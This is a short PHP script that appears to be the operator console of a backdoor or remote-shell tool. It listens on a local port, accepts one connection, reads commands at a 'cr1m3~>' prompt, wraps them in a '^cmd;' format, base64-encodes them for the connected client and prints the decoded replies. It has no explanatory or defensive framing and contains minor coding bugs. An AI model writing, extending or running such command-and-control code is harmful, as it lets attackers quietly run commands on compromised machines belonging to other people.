<?php
	$LOCAL_HOST = "127.0.0.1";
	$LOCAL_PORT = 80;


	if(($sock = socket_create(AF_INET, SOCK_STREAM,SOL_TCP))==FALSE) {
		echo("Error on create socket...\n");
		exit(1);
	}


	if (!socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1)) {
	    echo socket_strerror(socket_last_error($sock));
	    exit;
	}


	if(socket_bind($sock, $LOCAL_HOST, $LOCAL_PORT)==FALSE) {
		echo("Error on bind...\n");
		exit(1); 
	}

	if(socket_listen($sock,5)==FALSE) {
		echo("Error on listen...\n");
		exit(1);
	}

	echo("Listening on port [" . $LOCAL_PORT . "]\n");

	if(($client=socket_accept($sock))==FALSE) {
		echo("Error on accept");
		socket_close(sock);
		exit(1);
	}

	stream_set_timeout($sock,1,0);

	while(1) {
		fflush(STDIN);
		fflush(STDOUT);

		echo("cr1m3~> ");
		$line = trim(fgets(STDIN));
		//echo("LINE: " . $line . "\n");

		if($line[0]!='^')
			$line = "^cmd;" . $line . ";dasdasdasd";

		$encoded = base64_encode($line);
		socket_send($client,$encoded,strlen($encoded),0);
		socket_recv($client,$input,2048,0);
		echo(base64_decode(trim($input)) . "\n");

	}	

	echo("bye bye!\n");

?>
